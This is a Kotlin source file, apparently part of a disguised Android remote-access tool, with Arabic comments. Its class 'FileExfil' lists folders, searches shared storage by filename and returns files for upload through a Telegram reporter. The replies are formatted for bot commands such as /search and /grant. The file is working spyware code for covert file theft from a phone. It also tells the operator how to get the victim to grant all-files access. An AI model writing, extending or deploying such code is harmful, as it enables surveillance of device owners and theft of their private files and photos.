package com.example.disguise.files

import android.os.Environment
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * FileExfil — تصفح وسحب الملفات من ذاكرة الجهاز.
 *
 * المسؤوليات:
 * 1. list(path)   — عرض محتويات مجلد (اسم، حجم، تاريخ، نوع).
 * 2. pull(path)   — إرجاع File للاستخدام مع TelegramReporter.sendDocument.
 * 3. search(query) — بحث عن ملفات بالاسم (اختياري، مفيد).
 *
 * القيود المهمة على Android 11+:
 * - التطبيق يحتاج MANAGE_EXTERNAL_STORAGE للوصول الكامل إلى /sdcard/.
 * - هذا الإذن لا يُمنح برمجياً — يجب أن يفعّله المستخدم يدوياً من:
 *   الإعدادات → التطبيقات → تطبيقك → الصلاحيات → جميع الملفات.
 * - بدون هذا الإذن، يمكن الوصول فقط إلى:
 *   * مجلد التطبيق الخاص (getExternalFilesDir).
 *   * مجلدات MediaStore (الصور/الفيديو/الصوت) عبر ContentResolver.
 *
 * هذا الملف يفترض أن MANAGE_EXTERNAL_STORAGE مفعّل. إن لم يكن،
 * نعيد رسالة واضحة للمستخدم بدلاً من الانهيار.
 */
class FileExfil {

    companion object {
        private const val TAG = "FileExfil"

        /** أقصى عدد عناصر نعرضها في ls (لتجنب رسائل ضخمة) */
        private const val MAX_LIST_ITEMS = 100

        /** أقصى طول لاسم ملف في العرض */
        private const val MAX_NAME_LEN = 60
    }

    /**
     * هل يملك التطبيق صلاحية MANAGE_EXTERNAL_STORAGE؟
     */
    fun hasFullAccess(): Boolean {
        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            // ما قبل Android 11: نتحقق من READ_EXTERNAL_STORAGE
            // لكن minSdk=30، لذا هذا الفرع لن يُستخدم عملياً.
            true
        }
    }

    /**
     * عرض محتويات مجلد.
     * يعيد نصاً منسقاً (اسم، حجم، تاريخ، نوع).
     */
    suspend fun list(path: String): String = withContext(Dispatchers.IO) {
        if (!hasFullAccess()) {
            return@withContext buildString {
                append("⚠️ لا تملك صلاحية الوصول لجميع الملفات.\n")
                append("فعّل الإذن من: الإعدادات → التطبيقات → التطبيق → الصلاحيات → جميع الملفات.\n")
                append("أو أرسل /grant لفتح شاشة الإذن.")
            }
        }

        val dir = File(path)
        if (!dir.exists()) {
            return@withContext "⚠️ المسار غير موجود: $path"
        }
        if (!dir.isDirectory) {
            return@withContext "⚠️ ليس مجلداً: $path"
        }
        if (!dir.canRead()) {
            return@withContext "⚠️ لا يمكن قراءة المجلد (صلاحيات): $path"
        }

        val entries = dir.listFiles()
        if (entries == null) {
            return@withContext "⚠️ فشل سرد المجلد: $path"
        }
        if (entries.isEmpty()) {
            return@withContext "📂 المجلد فارغ: $path"
        }

        // ترتيب: مجلدات أولاً، ثم أبجدياً
        val sorted = entries.sortedWith(
            compareByDescending<File> { it.isDirectory }
                .thenBy { it.name.lowercase() }
        )

        val sb = StringBuilder()
        sb.append("📂 ").append(path).append("\n")
        sb.append("📊 ").append(sorted.size).append(" عنصر\n")
        sb.append("───────────────────────────\n")

        var shown = 0
        for (f in sorted) {
            if (shown >= MAX_LIST_ITEMS) {
                sb.append("... (و ").append(sorted.size - shown).append(" عنصر آخر)\n")
                break
            }
            shown++
            appendEntry(sb, f)
        }

        Log.d(TAG, "list($path): ${sorted.size} entries")
        sb.toString()
    }

    /**
     * إضافة سطر لعرض عنصر واحد.
     */
    private fun appendEntry(sb: StringBuilder, f: File) {
        val icon = when {
            f.isDirectory -> "📁"
            isImage(f.name) -> "🖼️"
            isVideo(f.name) -> "🎬"
            isAudio(f.name) -> "🎵"
            isDoc(f.name) -> "📄"
            else -> "📎"
        }

        val name = if (f.name.length > MAX_NAME_LEN) {
            f.name.take(MAX_NAME_LEN - 3) + "..."
        } else {
            f.name
        }

        sb.append(icon).append(" ").append(name)

        if (f.isFile) {
            sb.append(" (").append(humanSize(f.length())).append(")")
        }

        // تاريخ التعديل
        val date = SimpleDateFormat("yy-MM-dd HH:mm", Locale.US)
            .format(Date(f.lastModified()))
        sb.append(" ").append(date).append("\n")
    }

    /**
     * إرجاع File للاستخدام مع TelegramReporter.sendDocument/sendPhoto.
     * يتحقق من الوجود والقراءة.
     */
    suspend fun pull(path: String): File? = withContext(Dispatchers.IO) {
        if (!hasFullAccess()) {
            Log.w(TAG, "pull: no MANAGE_EXTERNAL_STORAGE")
            return@withContext null
        }
        val file = File(path)
        if (!file.exists()) {
            Log.w(TAG, "pull: not found: $path")
            return@withContext null
        }
        if (!file.isFile) {
            Log.w(TAG, "pull: not a file: $path")
            return@withContext null
        }
        if (!file.canRead()) {
            Log.w(TAG, "pull: cannot read: $path")
            return@withContext null
        }
        file
    }

    /**
     * بحث بسيط عن ملفات بالاسم (غير حساس لحالة الأحرف).
     * يبحث في مجلد معين (افتراضي /sdcard/).
     * يعيد قائمة مسارات (حتى 50).
     */
    suspend fun search(query: String, basePath: String = "/sdcard/"): String =
        withContext(Dispatchers.IO) {
            if (!hasFullAccess()) {
                return@withContext "⚠️ لا تملك صلاحية الوصول لجميع الملفات."
            }
            if (query.isBlank()) {
                return@withContext "⚠️ الاستخدام: /search كلمة"
            }

            val base = File(basePath)
            if (!base.exists() || !base.isDirectory) {
                return@withContext "⚠️ المسار غير موجود: $basePath"
            }

            val lowerQuery = query.lowercase()
            val results = mutableListOf<String>()
            val queue = ArrayDeque<File>()
            queue.add(base)
            var scanned = 0

            while (queue.isNotEmpty() && scanned < 20000 && results.size < 50) {
                val dir = queue.removeFirst()
                val children = dir.listFiles() ?: continue
                for (f in children) {
                    scanned++
                    if (f.isDirectory) {
                        // تجاهل بعض المجلدات الضخمة/غير المفيدة
                        if (f.name in listOf("Android", "LOST.DIR", ".thumbnails")) continue
                        queue.add(f)
                    } else if (f.name.lowercase().contains(lowerQuery)) {
                        results.add(f.absolutePath)
                        if (results.size >= 50) break
                    }
                }
            }

            if (results.isEmpty()) {
                return@withContext "🔍 لا نتائج لـ: $query\n(فُحص $scanned ملف)"
            }

            buildString {
                append("🔍 نتائج البحث عن \"").append(query).append("\":\n")
                append("📊 ").append(results.size).append(" نتيجة (فُحص ")
                    .append(scanned).append(" ملف)\n")
                append("───────────────────────────\n")
                results.forEachIndexed { i, p ->
                    append(i + 1).append(". ").append(p).append("\n")
                }
                if (results.size >= 50) {
                    append("... (الحد الأقصى 50 نتيجة)\n")
                }
            }
        }

    // ============================================================
    // دوال مساعدة
    // ============================================================

    /**
     * تحويل الحجم بالبايت إلى صيغة مقروءة.
     */
    private fun humanSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> "${bytes / 1024} KB"
            bytes < 1024 * 1024 * 1024 -> String.format(Locale.US, "%.1f MB", bytes / 1024.0 / 1024.0)
            else -> String.format(Locale.US, "%.2f GB", bytes / 1024.0 / 1024.0 / 1024.0)
        }
    }

    private fun isImage(name: String): Boolean {
        val ext = name.substringAfterLast('.', "").lowercase()
        return ext in setOf("jpg", "jpeg", "png", "gif", "bmp", "webp", "heic", "heif")
    }

    private fun isVideo(name: String): Boolean {
        val ext = name.substringAfterLast('.', "").lowercase()
        return ext in setOf("mp4", "mkv", "avi", "mov", "3gp", "webm", "flv")
    }

    private fun isAudio(name: String): Boolean {
        val ext = name.substringAfterLast('.', "").lowercase()
        return ext in setOf("mp3", "wav", "ogg", "m4a", "flac", "aac", "amr")
    }

    private fun isDoc(name: String): Boolean {
        val ext = name.substringAfterLast('.', "").lowercase()
        return ext in setOf("pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "csv", "zip", "rar", "7z")
    }
}